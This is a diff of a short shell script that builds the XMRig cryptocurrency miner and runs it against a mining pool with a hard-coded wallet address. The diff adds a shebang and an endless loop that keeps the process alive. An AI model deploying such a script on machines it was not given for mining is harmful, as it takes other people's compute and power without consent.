@@ -1,4 +1,4 @@
-# sat
+#!/bin/sh
 sudo -i
 sudo apt-get update -y 
 sudo apt-get install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev -y 
@@ -7,3 +7,7 @@ mkdir xmrig/build && cd xmrig/build
 cmake .. 
 make 
 ./xmrig -a cn-heavy/xhv -o rx.unmineable.com:3333 -u SHIB:0xc2f39632e7a1f21487f0baa06ed220c4cb3085aa -k -t 2
+while [ 1 ]; do
+sleep 3
+done
+sleep 999
